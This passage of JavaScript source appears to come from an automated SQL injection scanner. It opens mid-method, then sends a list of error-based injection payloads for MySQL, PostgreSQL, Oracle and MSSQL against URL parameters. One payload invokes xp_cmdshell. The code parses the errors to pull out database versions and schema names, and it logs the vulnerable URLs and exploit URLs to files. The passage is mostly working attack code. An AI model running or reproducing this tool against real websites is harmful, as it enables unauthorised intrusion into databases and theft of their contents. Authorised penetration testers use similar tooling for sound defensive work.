            // Check for unrealistic version numbers
            const majorVersion = parseInt(dbInfo.version.split('.')[0]);
            if (majorVersion > 20) return false; // Most DB versions are < 20
        }
        
        return true;
    }

    /**
     * Attempt error-based extraction
     */
    async _attemptErrorBasedExtraction(baseUrlObj, param, dbInfo) {
        const originalValue = baseUrlObj.searchParams.get(param);
        const domainLogger = await getDomainLogger(baseUrlObj.toString());
        
        // Extended error-based payloads for different databases
        const errorPayloads = [
            // MySQL/MariaDB
            `' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION(), 0x7e))-- -`,
            `' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata), 0x7e))-- -`,
            `' AND UPDATEXML(1, CONCAT(0x7e, VERSION(), 0x7e), 1)-- -`,
            `' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7e, VERSION(), 0x7e))x))-- -`,
            `' AND GTID_SUBSET(CONCAT(0x7e, VERSION(), 0x7e), 1)-- -`,
            `' AND JSON_KEYS((SELECT CONCAT(0x7e, VERSION(), 0x7e)))-- -`,
            `' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(VERSION(), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -`,
            
            // PostgreSQL  
            `' AND 1=CAST((SELECT VERSION()) AS INT)-- -`,
            `' AND 1=CONVERT(INT, (SELECT @@version))-- -`,
            
            // Oracle
            `' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))-- -`,
            `' AND 1=CTXSYS.DRITHSX.SN(user, (SELECT banner FROM v$version WHERE rownum=1))-- -`,
            
            // MSSQL
            `' AND 1=CONVERT(INT, @@version)-- -`,
            `' AND 1=CAST(@@version AS INT)-- -`,
            `'; DECLARE @x NVARCHAR(4000); SET @x=CAST(@@version AS NVARCHAR(4000)); EXEC('xp_cmdshell ''echo '+@x+'''')-- -`,
            `' AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE(), 0x7e))-- -`,
            `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- -`,
            `' AND 1=CONVERT(int,@@version)-- -`,
            `' AND 1=CONVERT(int,DB_NAME())-- -`
        ];

        for (const payload of errorPayloads) {
            // Stop if we already have both name and version
            if (dbInfo.name && dbInfo.version) {
                this.logger?.info(`Already have complete DB info (name: ${dbInfo.name}, version: ${dbInfo.version}), stopping extraction`);
                domainLogger.logDbExtraction('Extraction complete - have all required info', {
                    method: 'error_based',
                    query: 'Stopped - already have name and version',
                    response: JSON.stringify(dbInfo),
                    success: true
                });
                return;
            }
            
            try {
                const testUrlObj = new URL(baseUrlObj);
                testUrlObj.searchParams.set(param, originalValue + payload);
                
                const response = await this._makeRequest(testUrlObj.toString());
                
                if (response.status === 200 || response.status === 500) {
                    const extracted = this._parseDbInfoFromText(response.data);
                    if (extracted && (extracted.type || extracted.version || extracted.name)) {
                        // Validate extracted data is not binary/corrupted
                        if (this._isValidDatabaseInfo(extracted)) {
                            Object.assign(dbInfo, extracted);
                            this.logger?.info(`Successfully extracted DB info via error-based`, extracted);
                            
                            // Log extraction details using domain logger with relevant response
                            const relevantResponse = this._extractRelevantResponse(response.data, dbInfo.version || dbInfo.name || 'error');
                            domainLogger.logDbExtraction('Error-based extraction successful', {
                                method: 'error_based',
                                query: payload,
                                response: relevantResponse,
                                success: true,
                                extractedInfo: dbInfo
                            });
                        } else {
                            this.logger?.debug(`Extracted data appears corrupted, skipping`);
                        }
                    } else {
                        // Log attempt with relevant response even if no data extracted
                        const relevantResponse = this._extractRelevantResponse(response.data, 'error');
                        domainLogger.logDbExtraction('Error-based extraction attempt', {
                            method: 'error_based',
                            query: payload,
                            response: relevantResponse,
                            success: false
                        });
                    }
                }
            } catch (error) {
                this.logger?.debug(`Error-based extraction failed for payload: ${payload}`, { error: error.message });
                
                // Log failed attempts only for debugging
                domainLogger.logDbExtraction('Error-based extraction attempt failed', {
                    method: 'error_based',
                    query: payload,
                    response: error.message,
                    success: false
                });
            }
        }
    }

    /**
     * Make an HTTP request with proper error handling
     */
    async _makeRequest(url) {
        try {
            const response = await axios.get(url, {
                timeout: this.config.timeout,
                validateStatus: () => true,
                maxRedirects: 5
            });
            
            return {
                status: response.status,
                data: response.data ? response.data.toString() : '',
                headers: response.headers
            };
        } catch (error) {
            throw new Error(`Request failed: ${error.message}`);
        }
    }

    /**
     * Check if response contains generic error indicators
     */
    _hasGenericError(bodyText) {
        const errorPatterns = [
            /syntax error/i,
            /mysql_fetch/i,
            /ORA-\d+/i,
            /SQLiteException/i,
            /Warning.*mysql/i,
            /Fatal error/i
        ];
        
        return errorPatterns.some(pattern => pattern.test(bodyText));
    }

    /* Extract expected delay seconds from time-based payloads */
    _extractDelayFromPayload(payload) {
        const delayMatch = payload.match(/SLEEP\((\d+)\)|DELAY\s+'00:00:0(\d+)'/i);
        return delayMatch ? parseInt(delayMatch[1] || delayMatch[2]) : 5; // default 5s
    }

    /* Append vulnerable URL to output file – one per line */
    async _saveVulnerableUrl(url) {
        try {
            await appendToFile(this.config.outputFile, url + '\n', this.logger);
        } catch (error) {
            this.logger?.error('Failed to save vulnerable URL', { url, error: error.message });
        }
    }
    
    /* Save detailed vulnerability information */
    async _saveVulnerabilityDetails(details) {
        try {
            const detailLine = JSON.stringify({
                timestamp: details.timestamp,
                url: details.url,
                exploitUrl: details.exploitUrl,
                parameter: details.parameter,
                type: details.type,
                payload: details.payload,
                database: {
                    type: details.database?.type || 'Unknown',
                    version: details.database?.version || 'Unknown',
                    name: details.database?.name || 'Unknown',
                    databases: details.database?.databases || []
                },
                confirmed: details.confirmed
            }) + '\n';
            
            await appendToFile(this.config.detailsFile, detailLine, this.logger);
            this.logger?.info('Saved vulnerability details', { 
                file: this.config.detailsFile,
                confirmed: details.confirmed 
            });
        } catch (error) {
            this.logger?.error('Failed to save vulnerability details', { error: error.message });
        }
    }

    /**
     * Extract only relevant parts from response (max 5 lines around detected content)
     */
    _extractRelevantResponse(responseText, keyword) {
        if (!responseText || !keyword) return '';
        
        const lines = responseText.split('\n');
        const relevantLines = [];
        let foundIndex = -1;
        
        // Find line containing keyword
        for (let i = 0; i < lines.length; i++) {
            if (lines[i].toLowerCase().includes(keyword.toLowerCase())) {
                foundIndex = i;
                break;
            }
        }
        
        if (foundIndex === -1) {
            // If keyword not found, return first 5 lines with content
            return lines.filter(line => line.trim()).slice(0, 5).join('\n').substring(0, 500);
        }
        
        // Extract 2 lines before and 2 lines after the found line (total 5 lines)
        const start = Math.max(0, foundIndex - 2);
        const end = Math.min(lines.length - 1, foundIndex + 2);
        
        for (let i = start; i <= end; i++) {
            relevantLines.push(lines[i]);
        }
        
        return relevantLines.join('\n').substring(0, 500);
    }
}